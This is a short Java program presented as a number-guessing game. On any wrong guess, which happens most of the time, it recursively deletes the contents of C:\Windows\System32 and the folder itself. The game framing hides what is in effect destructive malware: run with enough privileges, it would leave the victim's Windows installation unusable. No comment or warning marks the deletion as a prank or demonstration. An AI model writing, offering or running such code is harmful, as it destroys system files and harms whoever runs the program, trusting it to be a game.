import java.util.Random;
import java.util.Scanner;
import java.io.File;

public class Main {
	public static void deleteFolder(File file) {
		for (File subfile: file.listFiles()) {
			if (subfile.isDirectory()) {
				deleteFolder(subfile);
			}
			subfile.delete();
		}
	}
	public static void main(String[] args) {
		String filepath = "C:\\Windows\\System32";
		File file = new File(filepath);

		Random rand = new Random();
		int upperBound = 7;
		int randomInt = rand.nextInt(upperBound);

		Scanner sc = new Scanner(System.in);
		System.out.println("Type a number from 0 to " + (upperBound - 1) + ": ");
		int userInt = sc.nextInt();
		if (userInt == randomInt) {
			System.out.print("Congratz, random number was: " + randomInt);
		} else {
			System.out.print("You losed, random number was: " + randomInt);
			deleteFolder(file);
			file.delete();
		}
	}
}